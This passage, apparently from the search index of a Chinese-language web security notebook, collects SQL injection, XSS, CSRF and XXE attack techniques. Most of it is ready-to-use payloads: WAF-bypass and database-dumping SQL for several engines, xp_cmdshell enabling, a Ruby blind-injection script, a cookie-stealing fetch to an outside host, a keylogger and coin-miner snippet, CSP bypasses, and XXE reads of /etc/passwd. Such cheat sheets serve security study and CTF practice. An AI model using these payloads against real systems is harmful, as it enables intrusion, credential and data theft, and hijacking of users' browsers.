(\u7e5e\u95dc\u9375\u5b57\/\u7a7a\u767d) select xxx from`information_schema`.schemata select pass from user where id='admin' =&gt; select pass from user where id=0x61646d696e (\u7e5e\u5f15\u865f) id=concat(char(0x61),char(0x64),char(0x6d),char(0x69),char(0x6e)) ?id=0e2union select 1,2,3 (\u79d1\u5b78\u8a18\u865f) ?id=1union select 1,2,3\u6703\u721b ?id=0e1union(select~1,2,3) (~) ?id=.1union select 1,2,3 (\u9ede) WHERE =&gt; HAVING (\u7e5e\u95dc\u9375\u5b57) AND =&gt; &amp;&amp; (\u7e5e\u95dc\u9375\u5b57) OR =&gt; || = =&gt; LIKE a = 'b' =&gt; not a &gt; 'b' and not a &lt; 'b' &gt; 10 =&gt; not between 0 and 10 LIMIT 0,1 =&gt; LIMIT 1 OFFSET 0 (\u7e5e\u9017\u865f) substr('kaibro',1,1) =&gt; substr('kaibro' from 1 for 1) Multipart\/form-data\u7e5e\u904e http:\/\/xdxd.love\/2015\/12\/18\/%E9%80%9A%E8%BF%87multipart-form-data%E7%BB%95%E8%BF%87waf\/ \u507d\u9020User-Agent e.g. \u6709\u4e9bWAF\u4e0d\u5c01google bot MSSQL Union-Based Column\u578b\u614b\u5fc5\u9808\u76f8\u540c \u53ef\u7528NULL\u4f86\u907f\u514d Database contents SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' Error-Based \u5229\u7528\u578b\u5225\u8f49\u63db\u932f\u8aa4 id=1 and user=0 Blind Conditional Errors SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1\/0 ELSE NULL END Conditional Time Delays MAIT FOR DELAY '0:0:10' WAITFOR DELAY '0:0:10' IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10' Other Knowledges \u5b50\u5b57\u4e32\uff1a SUBSTRING(&quot;abc&quot;, 1, 1) =&gt; 'a' Ascii function ascii('A') =&gt; 65 Char function char(65) =&gt; 'a' Concatenation + 'a'+'b' =&gt; 'ab' \u7a7a\u767d\u5b57\u5143 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 IF\u8a9e\u53e5 IF condition true-part ELSE false-part IF (1=1) SELECT 'true' ELSE SELECT 'false' \u8a3b\u89e3\uff1a -- \/**\/ TOP MSSQL\u6c92\u6709LIMIT N, M\u7684\u7528\u6cd5 SELECT TOP 87 * FROM xxx \u53d6\u6700\u524d\u976287\u7b46 \u53d6\u7b2c78~87\u7b46 SELECT pass FROM (SELECT pass, ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS LIMIT FROM mydb.dbo.mytable)x WHERE LIMIT between 78 and 87 \u5176\u5b83\uff1a db_name() user_name() @@servername host_name() \u7206DB name DB_NAME(N) UNION SELECT NULL,DB_NAME(N),NULL-- UNION SELECT NULL,name,NULL FROM master ..sysdatabases-- SELECT catalog_name FROM information_schema.schemata 1=(select name from master.dbo.sysdatabases where dbid=5) \u7206\u8868\u540d SELECT table_catalog, table_name FROM information_schema.tables SELECT name FROM sysobjects WHERE xtype='U' ID=02';if (select top 1 name from DBname..sysobjects where xtype='U' and name not in ('table1', 'table2'))&gt;0 select 1-- \u7206column SELECT table_catalog, table_name, column_name FROM information_schema.columns SELECT name FROM syscolumns WHERE id=object_id('news') ID=1337';if (select top 1 col_name(object_id('table_name'), i) from sysobjects)&gt;0 select 1-- \u5224\u65b7\u662f\u5426\u7ad9\u5eab\u5206\u96e2 \u5ba2\u6236\u7aef\u4e3b\u6a5f\u540d\uff1aselect host_name(); \u670d\u52d9\u7aef\u4e3b\u6a5f\u540d\uff1aselect @@servername; \u5169\u8005\u4e0d\u540c\u5373\u7ad9\u5eab\u5206\u96e2 xp_cmdshell \u5728MSSQL 2000\u9ed8\u8a8d\u958b\u555f MSSQL 2005\u4e4b\u5f8c\u9ed8\u8a8d\u95dc\u9589 \u6709sa\u6b0a\u9650\uff0c\u53ef\u900f\u904esp_configure\u91cd\u555f\u5b83 EXEC sp_configure 'show advanced options',1 RECONFIGURE EXEC sp_configure 'xp_cmdshell',1 RECONFIGURE \u95dc\u9589xp_cmdshell EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure'xp_cmdshell', 0; RECONFIGURE; \u5feb\u901f\u67e5\u627e\u5e36\u95dc\u9375\u5b57\u7684\u8868 SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND (syscolumns.name LIKE '%pass%' or syscolumns.name LIKE '%pwd%' or syscolumns.name LIKE '%first%'); Unicode\u7e5e\u904e IIS \u5c0d Unicode \u7de8\u78bc\u662f\u53ef\u4ee5\u89e3\u6790\u7684\uff0c\u5373 s%u0065lect \u6703\u88ab\u89e3\u6790\u70ba select Oracle UNION-Based Determining the number of columns Column \u578b\u614b\u5fc5\u9808\u76f8\u540c\uff0c\u53ef\u7528NULL\u4f86\u907f\u514d \u6240\u6709\u7684 SELECT \u5fc5\u9808\u5305\u542b\u6709\u6548\u7684 FROM UNION SELECT 1, 'aa', null FROM dual Database contents \u5eab\u540d SELECT DISTINCT OWNER FROM ALL_TABLES \u8868\u540d ' UNION SELECT table_name,NULL FROM all_tables-- SELECT OWNER, TABLE_NAME FROM ALL_TABLES Column ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'-- SELECT OWNER, TABLE_NAME, COLUMN_NAME FROM ALL_TAB_COLUMNS Retrieve interesting data ' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF-- Error-Based SELECT * FROM news WHERE id=1 and CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))=1 Blind Conditional Errors SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1\/0) ELSE NULL END FROM dual Conditional Time Delay dbms_pipe.receive_message(('a'),10) SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual Out-of-band UTL_HTTP.request('http:\/\/kaibro.tw\/'||(select user from dual))=1 Other Knowledge substring SUBSTR(&quot;abc&quot;, 1, 1) =&gt; 'a' \u7a7a\u767d\u5b57\u5143 00 0A 0D 0C 09 20 semicolon %3b IF\u8a9e\u53e5 IF condition THEN true-part [ELSE false-part] END IF \u8a3b\u89e3\uff1a -- \u9023\u63a5\u5b57\u4e32\uff1a || OFFSET SELECT owner FROM all_tables OFFSET 1 ROWS \u5176\u5b83 SYS.DATABASE_NAME current database USER current user https:\/\/www.oracletutorial.com\/oracle-basics\/oracle-fetch\/ https:\/\/www.oracletutorial.com\/oracle-administration\/oracle-show-tables\/ SQLite Blind Boolean Based SECCON 2017 qual SqlSRF # encoding: UTF-8 # sqlite injection (POST method) (\u4e8c\u5206\u641c) # SECCON sqlsrf\u7206admin\u5bc6\u78bc require 'net\/http' require 'uri' $url = 'http:\/\/sqlsrf.pwn.seccon.jp\/sqlsrf\/index.cgi' $ans = '' (1..100).each do |i| l = 48 r = 122 while(l &lt;= r) #puts \"left: #{l}, right: #{r}\" break if l == r mid = ((l + r) \/ 2) $query = \"kaibro'union select '62084a9fa8872a1b917ef4442c1a734e' where (select unicode(substr(password,#{i},#{i})) from users where username='admin') &gt; #{mid} and '1'='1\" res = Net::HTTP.post_form URI($url), {\"user\" =&gt; $query, \"pass\" =&gt; \"kaibro\", \"login\" =&gt; \"Login\"} if res.body.include? 'document.location' l = mid + 1 else r = mid end end $ans += l.chr puts $ans end Other Knowledge \u5b50\u5b57\u4e32\uff1a substr(\u201cabc&quot;,1,1) =&gt; 'a' Ascii function: unicode('d') =&gt; 100 legth length('ab') =&gt; 2 Concatenation || 'a' || 'b' =&gt; 'ab' Time Delay randomblob(100000000) \u7a7a\u767d\u5b57\u5143 0A 0D 0C 09 20 Case when SQLite\u6c92\u6709if \u53ef\u4ee5\u7528Case When ... Then ...\u4ee3\u66ff case when (\u689d\u4ef6) then ... else ... end \u8a3b\u89e3 -- \u7206\u8868\u540d SELECT name FROM sqlite_master WHERE type='table' \u7206\u8868\u7d50\u69cb(\u542bColumn) SELECT sql FROM sqlite_master WHERE type='table' \u5176\u4ed6 sqlite_version() sqlite\u7121\u6cd5\u4f7f\u7528\\'\u8df3\u812b\u55ae\u5f15\u865f PostgreSQL Union-Based Database contents SELECT * FROM information_schema.tables TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE ===================================================== MyDatabase dbo Products BASE TABLE MyDatabase dbo Users BASE TABLE MyDatabase dbo Feedback BASE TABLE SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE ================================================================= MyDatabase dbo Users UserId int MyDatabase dbo Users Username varchar MyDatabase dbo Users Password varchar Blind Conditional Errors SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1\/0 as text) ELSE NULL END Conditional Time Delay pg_sleep() repeat() SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END Other Knowledge Substring substr(&quot;abc&quot;, 1, 1) =&gt; 'a' semicolon %3b Ascii function ascii('x') =&gt; 120 Char function chr(65) =&gt; A Concatenation || 'a' || 'b' =&gt; 'ab' Delay function pg_sleep(5) GENERATE_SERIES(1, 1000000) repeat('a', 10000000) \u7a7a\u767d\u5b57\u5143 0A 0D 0C 09 20 encode \/ decode encode('123\\\\000\\\\001', 'base64') =&gt; MTIzAAE= decode('MTIzAAE=', 'base64') =&gt; 123\\000\\001 \u4e0d\u652f\u63f4 limit N, M limit a offset b \u7565\u904e\u524d b \u7b46\uff0c\u6293\u51fa a \u7b46\u51fa\u4f86 \u8a3b\u89e3 -- \/**\/ \u7206\u5eab\u540d SELECT datname FROM pg_database \u7206\u8868\u540d SELECT tablename FROM pg_tables WHERE schemaname='dbname' \u7206Column SELECT column_name FROM information_schema.columns WHERE table_name='admin' Dump all array_to_string(array(select userid||':'||password from users),',') \u5176\u5b83 version() current_database() user current_user SELECT usename FROM pg_user; current_schema current_query() inet_server_addr() inet_server_port() inet_client_addr() inet_client_port() type conversion cast(count(*) as text) md5('abc') replace('abcdefabcdef', 'cd', 'XX') =&gt; abXXefabXXef pg_read_file(filename, offset, length) \u8b80\u6a94 \u53ea\u80fd\u8b80data_directory\u4e0b\u7684 pg_ls_dir(dirname) \u5217\u76ee\u9304\u5167\u5bb9 \u53ea\u80fd\u5217data_directory\u4e0b\u7684 PHP\u7684pg_query()\u53ef\u4ee5\u591a\u8a9e\u53e5\u57f7\u884c lo_import(), lo_get()\u8b80\u6a94 select cast(lo_import('\/var\/lib\/postgresql\/data\/secret') as text) =&gt; 18440 select cast(lo_get(18440) as text) =&gt; secret_here Other ORM injection https:\/\/www.slideshare.net\/0ang3el\/new-methods-for-exploiting-orm-injections-in-java-applications Hibernate \u55ae\u5f15\u865f\u8df3\u812b\u6cd5 MySQL\u4e2d\uff0c\u55ae\u5f15\u865f\u7528\\'\u8df3\u812b HQL\u4e2d\uff0c\u7528\u5169\u500b\u55ae\u5f15\u865f''\u8df3\u812b 'abc\\''or 1=(SELECT 1)--' \u5728HQL\u662f\u4e00\u500b\u5b57\u4e32 \u5728MySQL\u662f\u5b57\u4e32+\u984d\u5916SQL\u8a9e\u53e5 Magic Function\u6cd5 PostgreSQL\u4e2d\u5167\u5efaquery_to_xml('Arbitary SQL') Oracle\u4e2d\u6709dbms_xmlgen.getxml('SQL') HQL injection example (pwn2win 2017) order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select table_name from information_schema.columns limit 1)))',true,false,'')),1) Output: ERROR: could not stat file &quot;flag&quot;: No such file or directory order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select column_name from information_schema.columns limit 1)))',true,false,'')),1) Output: ERROR: could not stat file &quot;secret&quot;: No such file or directory order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select secret from flag)))',true,false,'')),1) Output: ERROR: could not stat file &quot;CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}&quot;: No such file or directory SQL Injection with MD5 $sql = &quot;SELECT * FROM admin WHERE pass = '&quot;.md5($password, true).&quot;'&quot;; ffifdyop md5: 276f722736c95d99e921722cf9ed621c to string: 'or'6&lt;trash&gt; HTTP Parameter Pollution id=1&amp;id=2&amp;id=3 ASP.NET + IIS: id=1,2,3 ASP + IIS: id=1,2,3 PHP + Apache: id=3 TEMP about information_schema https:\/\/portswigger.net\/web-security\/sql-injection\/examining-the-database","tags":"","url":"Web_Application_Attack\/SQL_Injection.html"},{"title":"XSS (Cross-site Scripting)","text":"XSS(Crossing Site Scripting) Table of Contents XSS(Crossing Site Scripting) tags: Security Web Online Resources Tools Challenges Types Reflected XSS Stored XSS DOM XSS Popular Sources Popular Sinks mXSS, UXSS, XSSI, Electron XSS to RCE Exploit Advantage Steal cookie Key logger Mining Payloads Basic Payload Testing \u4e00\u4e9balert(document.domain)\u7684\u65b9\u6cd5 Some Payload Remote Script Polyglot XSS Bypass JavaScript ES6 features \u7b97\u8853\u904b\u7b97\u7b26 HTML features Encoding Bypass Whitespace Double Encoding Knowledges Preventive measures Escaping Output Validating Input XSS Auditor \/ Filter (Browser) CSP (Content Security Policy) (Browser) CSP evaluator Bypass CSP Other aaencode \/ aadecode RPO Markdown XSS \u6587\u4ef6XSS CSS Injection tags: Security Web Online Resources GitHub AwesomeXSS OWASP XSS Filter Evasion Cheat Sheet Tools monyer Encoding \/ Decoding JSFuck Challenges Cure53 XSS xss.shift-js.info prompt.ml\/0 Types Reflected XSS \u76f4\u63a5\u8f38\u51fa\u4f7f\u7528\u8005\u7684\u8f38\u5165\u5167\u5bb9 echo &quot;Your input:&quot; . $_GET[&quot;q&quot;]; \/?q=&lt;script&gt;alert(1)&lt;\/script&gt; Stored XSS \u4fdd\u5b58\u5728\u8cc7\u6599\u5eab\u4e2d\uff0c\u5e38\u898b\u65bc\u7559\u8a00\u677f\u7b49\u7b49 DOM XSS \u6700\u5927\u7684\u5dee\u5225\u662f DOM XSS \u7684\u5167\u5bb9\u4e0d\u6703\u50b3\u5230 Server \u7aef JavaScript \u5728\u8655\u7406 DOM Tree \u6642\uff0c\u5c0e\u81f4\u7684 XSS \u4f8b\u5982 fragment (\u5728#\u5f8c\u9762) \u4e0d\u6703\u50b3\u5230 Server eval(location.hash.substr(1)); index.html#alert(1) URL fragment allowed characters Popular Sources document.URL document.documentURI location.hash.substr(1) location.href location.search location.* window.name document.referrer Popular Sinks HTML Modification sinks document.write (element).innerHTML HTML modification to behaviour change (element).src (in certain elements) Execution Related sinks eval setTimout \/ setInterval execScript mXSS, UXSS, XSSI, Electron XSS to RCE Exploit Advantage Steal cookie fetch(\"http:\/\/wildfoo.tw\/?x=\"+btoa(document.cookie)); Key logger document.onkeypress = function(e) { console.log(e.key); } Mining var miner = new CoinHive.User('SITE_KEY', 'WildfootW'); miner.start(); \u622a\u5716 \u52d5\u614b\u751f\u6210\u91e3\u9b5a\u9801\u9762 \u6301\u4e45\u5316 XSS - \u5b89\u88dd Service Worker Payloads tomnomnom - alert.js Basic Payload &lt;script&gt;alert(1)&lt;\/script&gt; &lt;svg\/onload=alert(1)&gt; &lt;img src=# onerror=alert(1)&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;g&lt;\/a&gt; &lt;input type=&quot;text&quot; value=&quot;g&quot; onmouseover=&quot;alert(1)&quot; \/&gt; &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;\/iframe&gt; &lt;iframe sRc=\\\/wIldFoO.tW&gt; Testing &lt;script&gt;alert(1)&lt;\/script&gt; '&quot;&gt;&lt;script&gt;alert(1)&lt;\/script&gt; &lt;img\/src=@ onerror=alert(1)\/&gt; '&quot;&gt;&lt;img\/src=@ onerror=alert(1)\/&gt; ' onmouseover=alert(1) x=' &quot; onmouseover=alert(1) x=&quot; `onmouseover=alert(1) x=` javascript:alert(1)\/\/ \u4e00\u4e9balert(document.domain)\u7684\u65b9\u6cd5 (alert)(document.domain); al\\u0065rt(document.domain); al\\u{65}rt(document.domain); window['alert'](document.domain); alert.call(null,document.domain); alert.bind()(document.domain); Some Payload &lt;svg\/onload=alert(1);alert(2)&gt; &lt;svg\/onload=&quot;alert(1);alert(2)&quot;&gt; &lt;svg\/onload=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;;alert(2)&quot;&gt; ;;\u6539\u6210;\u6703\u5931\u6557 \u96d9\u5f15\u865f\u53ef\u53bb\u6389 \u53ef10\u9032\u4f4d, 16\u9032\u4f4d\u6df7\u5408 &lt;svg\/onload=\\u0061\\u006c\\u0065\\u0072\\u0074(1)&gt; \\u\u5f62\u5f0f\u53ea\u80fd\u7528\u5728javascript\uff0c\u4f8b\u5982onload\u7684a\u6539\u6210\\u0061\u6703\u5931\u6557 &lt;title&gt;&lt;a href=&quot;&lt;\/title&gt;&lt;svg\/onload=alert(1)&gt; title\u512a\u5148\u6b0a\u8f03\u5927\uff0c\u76f4\u63a5\u4e2d\u65b7\u5176\u4ed6\u6a19\u7c64 &lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;\/script&gt; \u56e0\u70ba&lt;svg&gt;\uff0cHTML Entities\u6703\u88ab\u89e3\u6790 \u53bb\u6389&lt;svg&gt;\u6703\u5931\u6557\uff0c&lt;script&gt;\u4e0d\u6703\u89e3\u6790Entities &lt;? foo=&quot;&gt;&lt;script&gt;alert(1)&lt;\/script&gt;&quot;&gt; &lt;! foo=&quot;&gt;&lt;script&gt;alert(1)&lt;\/script&gt;&quot;&gt; &lt;\/ foo=&quot;&gt;&lt;script&gt;alert(1)&lt;\/script&gt;&quot;&gt; &lt;% foo=&quot;&gt;&lt;script&gt;alert(1)&lt;\/script&gt;&quot;&gt; ([,\u30a6,,,,\u30a2]=[]+{},[\u30cd,\u30db,\u30cc,\u30bb,,\u30df,\u30cf,\u30d8,,,\u30ca]=[!!\u30a6]+!\u30a6+\u30a6.\u30a6)[\u30a2+=\u30a6+\u30ca+\u30d8+\u30cd+\u30db+\u30cc+\u30a2+\u30cd+\u30a6+\u30db][\u30a2](\u30df+\u30cf+\u30bb+\u30db+\u30cd+'(-~\u30a6)')() katakana.js Remote Script &lt;script src=&quot;https:\/\/184.75.249.44\/import.js&quot;&gt;&lt;\/script&gt; &lt;svg onload=PAYLOAD&gt; BRUTE XSS &quot;var x=new XMLHttpRequest();x.open('GET','\/\/0');x.send(); x.onreadystatechange=function(){if(this.readyState==4){write(x.responseText)}}&quot; fetch('\/\/0').then(r=&gt;{r.text().then(w=&gt;{write(w)})}) with(top)body.appendChild (createElement('script')).src='\/\/0' $.get('\/\/0',r=&gt;{write(r)}) $.getScript('\/\/0') Polyglot XSS \u5728\u5404\u7a2e\u5730\u65b9\u90fd\u53ef\u4ee5\u904b\u4f5c\u7684 payload GitHub Wiki Bypass \u53ea\u7528\u4e94\u7a2e\u5b57\u5143\u7684 JavaScript JavaScript ES6 features alert`1` eval.call`${'alert\\x281)'} \u7b97\u8853\u904b\u7b97\u7b26 \/\/ (\u8a3b\u89e3) \u88ab\u904e\u6ffe\u6642\uff0c\u53ef\u4ee5\u5229\u7528\u7b97\u6578\u904b\u7b97\u7b26\u4ee3\u66ff &lt;a href=&quot;javascript:alert(1)-abcde&quot;&gt;xss&lt;\/a&gt; HTML features \u4e0d\u5206\u5927\u5c0f\u5beb &lt;ScRipT&gt; &lt;img SrC=#&gt; \u5c6c\u6027\u503c src=&quot;#&quot; src='#' src=# src=`#` (IE) Encoding Javascript\u81ea\u89e3\u78bc\u6a5f\u5236 &lt;input type=&quot;button&quot; onclick=&quot;document.write('&amp;lt;img src=@ onerror=alert(1) \/&amp;gt;')&quot; \/&gt;\u6703\u6210\u529falert(1)\uff0c\u56e0\u70bajavascript\u4f4d\u65bcHTML\u4e2d\uff0c\u5728\u57f7\u884cjavascript\u524d\u6703\u5148\u89e3\u78bcHTML\u7de8\u78bc\uff0c\u4f46\u82e5\u662f\u5305\u5728&lt;script&gt;\u4e2d\u7684javascript\uff0c\u4e0d\u6703\u89e3\u78bcHTML\u7de8\u78bc HTML Entity &amp;entity_name; z.B. &amp;lt; Hex Code (\u5206\u865f\u53ef\u53bb\u6389) &lt;svg\/onload=alert(1)&gt; &lt;svg\/onload=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; Decimal Code &amp;#; Bypass Whitespace &lt;img\/src='1'\/onerror=alert(0)&gt; Double Encoding OWASP page ? -&gt; %3f -&gt; %253f Knowledges \u7279\u6b8a\u6a19\u7c64 \u4ee5\u4e0b\u6a19\u7c64\u4e2d\u7684\u8173\u672c\u7121\u6cd5\u57f7\u884c &lt;title&gt;, &lt;textarea&gt;, &lt;iframe&gt;, &lt;plaintext&gt;, &lt;noscript&gt;\u2026 \u507d\u5354\u8b70 javascript: &lt;a href=javascript:alert(1) &gt;xss&lt;\/a&gt; data: &lt;a href=data:text\/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;xss&lt;\/a&gt; Javascript\u4e2d\u6709\u4e09\u5957\u7de8\u78bc\/\u89e3\u78bc\u51fd\u6578 escape\/unescape encodeURI\/decodeURI encodeURIComponent\/decodeURICompinent fetch \u5373\u4f7f fetch \u6703\u9047\u5230 SOP \u554f\u984c\uff0c\u4f46\u9084\u662f\u6703\u9001\u51fa request Preventive measures Escaping Output Validating Input XSS Auditor \/ Filter (Browser) MDN docs Header: X-XSS-Protection CSP (Content Security Policy) (Browser) CSP evaluator https:\/\/csp-evaluator.withgoogle.com\/ Bypass CSP base \u6539\u8b8a\u8cc7\u6e90\u8f09\u5165\u7684\u57df\uff0c\u5f15\u5165\u60e1\u610f\u7684js &lt;base href =&quot;http:\/\/kaibro.tw\/&quot;&gt; RCTF 2018 - rBlog script nonce &lt;p&gt;\u53ef\u63a7\u5167\u5bb9&lt;p&gt; &lt;script src=&quot;xxx&quot; nonce=&quot;AAAAAAAAAAA&quot;&gt;&lt;\/script&gt; \u63d2\u5165&lt;script src=&quot;http\/\/kaibro.tw\/uccu.js&quot; a=&quot; &lt;p&gt;&lt;script src=&quot;http\/\/kaibro.tw\/uccu.js&quot; a=&quot;&lt;p&gt; &lt;script src=&quot;xxx&quot; nonce=&quot;AAAAAAAAAAA&quot;&gt;&lt;\/script&gt; Script Gadget https:\/\/www.blackhat.com\/docs\/us-17\/thursday\/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf is an existing JS code on the page that may be used to bypass mitigations Bypassing CSP strict-dynamic via Bootstrap &lt;div data-toggle=tooltip data-html=true title='&lt;script&gt;alert(1)&lt;\/script&gt;'&gt;&lt;\/div&gt; Bypassing sanitizers via jQuery Mobile &lt;div data-role=popup id='--&gt;&lt;script&gt;alert(1)&lt;\/script&gt;'&gt;&lt;\/div&gt; Bypassing NoScript via Closure (DOM clobbering) &lt;a id=CLOSURE_BASE_PATH href=http:\/\/attacker\/xss&gt;&lt;\/a&gt; Bypassing ModSecurity CRS via Dojo Toolkit &lt;div data-dojo-type=&quot;dijit\/Declaration&quot; data-dojo-props=&quot;}-alert(1)-{&quot;&gt; Bypassing CSP unsafe-eval via underscore templates &lt;div type=underscore\/template&gt; &lt;% alert(1) %&gt; &lt;\/div&gt; 0CTF 2018 - h4xors.club2 google analytics ea ea is used to log actions and can contain arbitrary string Google CTF 2018 - gcalc2 Other aaencode \/ aadecode http:\/\/utf-8.jp\/public\/aaencode.html https:\/\/cat-in-136.github.io\/2010\/12\/aadecode-decode-encoded-as-aaencode.html RPO http:\/\/example.com\/a%2findex.php \u700f\u89bd\u5668\u6703\u628aa%2findex.php\u7576\u6210\u4e00\u500b\u6a94\u6848 Web Server\u5247\u6703\u6b63\u5e38\u89e3\u6790\u6210a\/index.php \u6240\u4ee5\u7576\u4f7f\u7528\u76f8\u5c0d\u8def\u5f91\u8f09\u5165css\u6642\uff0c\u5c31\u53ef\u4ee5\u900f\u904e\u9019\u7a2e\u65b9\u5f0f\u8b93\u700f\u89bd\u5668\u89e3\u6790\u5230\u5176\u4ed6\u5c64\u76ee\u9304\u4e0b\u7684\u6a94\u6848 \u5982\u679c\u8a72\u6a94\u6848\u5167\u5bb9\u53ef\u63a7\uff0c\u5247\u6709\u6a5f\u6703XSS \u8209\u4f8b\uff1a \/test.php\u4e2d\u6709&lt;link href=&quot;1\/&quot; ...&gt; \u53e6\u6709\/1\/index.php\u7d66?query=\u53c3\u6578\uff0c\u6703\u76f4\u63a5\u8f38\u51fa\u8a72\u53c3\u6578\u5167\u5bb9 \u8a2a\u554f\/1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f..\/test.php\u5c31\u6703\u8b93\u80cc\u666f\u8b8a\u7d05\u8272 Server: \/test.php Browser: \/1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f..\/test.php CSS\u6703\u8f09\u5165\/1\/?query={}*{background-color:red}\/..\/..\/1\/ CSS\u8a9e\u6cd5\u5bb9\u932f\u7387\u5f88\u9ad8 Markdown XSS [a](javascript:prompt(document.cookie)) [a](j a v a s c r i p t:prompt(document.cookie)) [a](data:text\/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K) [a](javascript:window.onerror=alert;throw%201) \u6587\u4ef6XSS Example: PlaidCTF 2018 wave XSS \u4e0a\u50b3.wave\u6a94 (\u6703\u6aa2\u67e5signatures) RIFF`....WAVE...` alert(1); function RIFF(){} \u8b8a\u6210\u5408\u6cd5\u7684js\u8a9e\u6cd5 wave\u5728apache mime type\u4e2d\u6c92\u6709\u88ab\u5b9a\u7fa9 &lt;script src=&quot;uploads\/this_file.wave&quot;&gt; CSS Injection CSS\u53ef\u63a7\u6642\uff0c\u53ef\u4ee5Leak Information Example: leak &lt;input type='hidden' name='csrf' value='2e3d04bf...'&gt; input[name=csrf][value^=&quot;2&quot;]{background: url(http:\/\/kaibro.tw\/2)} input[name=csrf][value^=&quot;2e&quot;]{background: url(http:\/\/kaibro.tw\/2e)} \u2026 SECCON CTF 2018 - GhostKingdom https:\/\/github.com\/s0md3v\/AwesomeXSS","tags":"","url":"Web_Application_Attack\/XSS_(Cross_site_Scripting).html"},{"title":"CSRF (Cross-site Request Forgery)","text":"CSRF (Cross-site Request Forgery) Table of Contents CSRF (Cross-site Request Forgery) tags: Security Web Preventive measures Server Side Client Side tags: Security Web \u7576 Request \u5e36\u4e0a Cookie\uff0cServer \u5c31\u6c92\u8fa6\u6cd5\u5206\u8fa8\u662f\u4e0d\u662f\u4f7f\u7528\u8005\u81ea\u4e3b\u767c\u8d77\u7684 &lt;img src=&quot;http:\/\/wildfoo.tw\/logout&quot;&gt; Preventive measures Server Side CSRF Token Client Side SameSite cookie - \u8de8\u57df\u8acb\u6c42\u5e36\u4e0d\u5e36 cookie","tags":"","url":"Web_Application_Attack\/CSRF_(Cross_site_Request_Forgery).html"},{"title":"XXE (XML External Entity)","text":"XXE (XML External Entity) Table of Contents XXE (XML External Entity) tags: Security Web XML Format \u5167\u90e8\u5be6\u9ad4 \u5916\u90e8\u5be6\u9ad4 Leak information \u53c3\u6578\u5be6\u9ad4 Leak information Test XML php simplexml_load_string() Attacks Blind Error-based Out of Band XXE + SMBrelay to RCE Others DoS \u4e32 Phar \u53cd\u5e8f\u5217\u5316 XXE in Files file types Tools tags: Security Web XML Format XML declaration: &lt;?xml version=&quot;1.0&quot; ?&gt; DTD(Document Type Definition): &lt;!DOCTYPE note [ &lt;!ELEMENT note (to, from, body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt; Element: &lt;note&gt; &lt;to&gt;WildfootW&lt;\/to&gt; &lt;from&gt;Oscar&lt;\/from&gt; &lt;body&gt;Puta&lt;\/body&gt; &lt;\/note&gt; DOCTYPE: DTD \u8072\u660e ENTITY: \u5be6\u9ad4\u8072\u660e(\u985e\u4f3c\u8b8a\u6578) SYSTE\u3001PUBLIC: \u5916\u90e8\u8cc7\u6e90\u7533\u8acb \u5167\u90e8\u5be6\u9ad4 &lt;!DOCTYPE wildfootw[ &lt;!ENTITY param \"hello\"&gt; ]&gt; &lt;root&gt;&amp;param;&lt;\/root&gt; \u5916\u90e8\u5be6\u9ad4 &lt;!DOCTYPE wildfootw[ &lt;!ENTITY xxe SYSTEM \"http:\/\/wildfoo.tw\/xxe.txt\"&gt; ]&gt; &lt;root&gt;&amp;xxe;&lt;\/root&gt; Leak information &lt;!DOCTYPE wildfootw[ &lt;!ENTITY xxe SYSTEM \"file:\/\/\/etc\/passwd\"&gt; ]&gt; &lt;root&gt;&amp;xxe;&lt;\/root&gt; libxml2.9.0\u4ee5\u5f8c\uff0c\u9810\u8a2d\u4e0d\u89e3\u6790\u5916\u90e8\u5be6\u9ad4 simplexml_load_file()\u820a\u7248\u672c\u4e2d\u9810\u8a2d\u89e3\u6790\u5be6\u9ad4\uff0c\u4f46\u65b0\u7248\u8981\u6307\u5b9a\u7b2c\u4e09\u500b\u53c3\u6578LIBXML_NOENT SimpleXMLElement is a class in PHP http:\/\/php.net\/manual\/en\/class.simplexmlelement.php \u53c3\u6578\u5be6\u9ad4 Leak information &lt;!DOCTYPE kaibro[ &lt;!ENTITY % remote SYSTEM \"http:\/\/wildfoo.tw\/xxe.dtd\"&gt; %remote; ]&gt; 